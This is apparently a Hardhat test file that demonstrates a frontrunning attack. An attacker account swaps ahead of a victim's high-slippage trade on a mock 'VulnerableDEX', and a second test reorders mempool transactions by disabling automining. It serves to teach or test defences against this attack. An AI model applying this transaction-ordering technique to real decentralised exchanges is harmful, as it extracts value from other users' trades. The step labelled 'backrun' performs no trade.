const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Frontrunning Attack PoC", function () {
    let tokenA, tokenB, dex;
    let deployer, victim, attacker, observer;
    let initialPrice;

    beforeEach(async function () {
        // Get signers representing different actors
        [deployer, victim, attacker, observer] = await ethers.getSigners();

        // Deploy mock ERC20 tokens
        const MockERC20 = await ethers.getContractFactory("MockERC20");
        tokenA = await MockERC20.deploy("Token A", "TKA", ethers.parseEther("1000000"));
        tokenB = await MockERC20.deploy("Token B", "TKB", ethers.parseEther("1000000"));

        // Deploy DEX
        const VulnerableDEX = await ethers.getContractFactory("VulnerableDEX");
        dex = await VulnerableDEX.deploy(tokenA.target, tokenB.target);

        // Setup initial liquidity (1000 TKA : 2000 TKB = 1:2 ratio)
        await tokenA.transfer(deployer.address, ethers.parseEther("1000"));
        await tokenB.transfer(deployer.address, ethers.parseEther("2000"));
        
        await tokenA.approve(dex.target, ethers.parseEther("1000"));
        await tokenB.approve(dex.target, ethers.parseEther("2000"));
        
        await dex.addLiquidity(ethers.parseEther("1000"), ethers.parseEther("2000"));

        // Record initial price
        initialPrice = await dex.getPrice();
        console.log("Initial price (TKB per TKA):", ethers.formatEther(initialPrice));

        // Distribute tokens to participants
        await tokenA.mint(victim.address, ethers.parseEther("500"));
        await tokenA.mint(attacker.address, ethers.parseEther("100"));
        
        await tokenB.mint(victim.address, ethers.parseEther("1000"));
        await tokenB.mint(attacker.address, ethers.parseEther("200"));
    });

    it("Should demonstrate successful frontrunning attack", async function () {
        console.log("\n=== FRONTRUNNING ATTACK SIMULATION ===");
        
        // STEP 1: Observer records initial state
        console.log("\n1. Initial State:");
        const initialReserveA = await dex.reserveA();
        const initialReserveB = await dex.reserveB();
        console.log("Reserve A:", ethers.formatEther(initialReserveA));
        console.log("Reserve B:", ethers.formatEther(initialReserveB));
        console.log("Price:", ethers.formatEther(initialPrice));

        // STEP 2: Victim prepares large swap with high slippage tolerance
        console.log("\n2. Victim prepares large swap...");
        const victimSwapAmount = ethers.parseEther("100"); // Large swap
        const victimMinOut = ethers.parseEther("150"); // High slippage tolerance (25%)
        
        console.log("Victim wants to swap:", ethers.formatEther(victimSwapAmount), "TKA");
        console.log("Expected output without frontrunning:", 
            ethers.formatEther(await dex.getAmountOut(victimSwapAmount, initialReserveA, initialReserveB)));

        // STEP 3: Attacker observes victim's transaction and frontruns
        console.log("\n3. Attacker frontruns victim's transaction...");
        const attackerSwapAmount = ethers.parseEther("50"); // Smaller but strategic amount
        
        // Attacker approves and executes swap FIRST
        await tokenA.connect(attacker).approve(dex.target, attackerSwapAmount);
        await dex.connect(attacker).swapAForB(attackerSwapAmount, 0);
        
        // Record state after frontrun
        const afterFrontrunReserveA = await dex.reserveA();
        const afterFrontrunReserveB = await dex.reserveB();
        const priceAfterFrontrun = await dex.getPrice();
        
        console.log("Price after frontrun:", ethers.formatEther(priceAfterFrontrun));
        console.log("Price impact:", 
            ((Number(ethers.formatEther(priceAfterFrontrun)) - Number(ethers.formatEther(initialPrice))) / 
             Number(ethers.formatEther(initialPrice)) * 100).toFixed(2) + "%");

        // STEP 4: Victim's transaction executes at worse price
        console.log("\n4. Victim's transaction executes at manipulated price...");
        await tokenA.connect(victim).approve(dex.target, victimSwapAmount);
        
        const victimBalanceBefore = await tokenB.balanceOf(victim.address);
        await dex.connect(victim).swapAForB(victimSwapAmount, victimMinOut);
        const victimBalanceAfter = await tokenB.balanceOf(victim.address);
        
        const victimActualOut = victimBalanceAfter - victimBalanceBefore;
        console.log("Victim received:", ethers.formatEther(victimActualOut), "TKB");
        
        // STEP 5: Attacker can backrun for additional profit (optional)
        console.log("\n5. Attacker backruns for additional profit...");
        const finalReserveA = await dex.reserveA();
        const finalReserveB = await dex.reserveB();
        const finalPrice = await dex.getPrice();
        
        console.log("Final price:", ethers.formatEther(finalPrice));
        
        // Calculate attacker's profit
        const attackerBalanceB = await tokenB.balanceOf(attacker.address);
        console.log("Attacker's TKB balance:", ethers.formatEther(attackerBalanceB));

        // STEP 6: Display attack summary
        console.log("\n=== ATTACK SUMMARY ===");
        console.log("Initial price:", ethers.formatEther(initialPrice));
        console.log("Price after frontrun:", ethers.formatEther(priceAfterFrontrun));
        console.log("Final price:", ethers.formatEther(finalPrice));
        
        const totalPriceImpact = ((Number(ethers.formatEther(finalPrice)) - Number(ethers.formatEther(initialPrice))) / 
                                 Number(ethers.formatEther(initialPrice)) * 100).toFixed(2);
        console.log("Total price impact:", totalPriceImpact + "%");
        
        // Verify attack was successful
        expect(priceAfterFrontrun).to.be.lt(initialPrice); // Price decreased due to frontrun
        expect(finalPrice).to.be.lt(priceAfterFrontrun);   // Price decreased further after victim's swap
    });

    it("Should demonstrate manual transaction ordering", async function () {
        console.log("\n=== MANUAL TRANSACTION ORDERING DEMO ===");
        
        // Disable auto-mining to manually control transaction order
        await network.provider.send("evm_setAutomine", [false]);
        
        // STEP 1: Victim submits transaction to mempool
        console.log("\n1. Victim submits transaction to mempool...");
        await tokenA.connect(victim).approve(dex.target, ethers.parseEther("100"));
        const victimTxPromise = dex.connect(victim).swapAForB(
            ethers.parseEther("100"), 
            ethers.parseEther("150")
        );
        
        // STEP 2: Attacker observes and submits frontrun transaction
        console.log("2. Attacker observes and submits frontrun transaction...");
        await tokenA.connect(attacker).approve(dex.target, ethers.parseEther("50"));
        const attackerTxPromise = dex.connect(attacker).swapAForB(
            ethers.parseEther("50"), 
            0
        );
        
        // STEP 3: Mine block to execute transactions in order
        console.log("3. Mining block with transactions...");
        await network.provider.send("evm_mine");
        
        // Wait for transactions to complete
        await attackerTxPromise;
        await victimTxPromise;
        
        // Re-enable auto-mining
        await network.provider.send("evm_setAutomine", [true]);
        
        console.log("Transactions executed in order: Attacker -> Victim");
        console.log("Final price:", ethers.formatEther(await dex.getPrice()));
    });
});
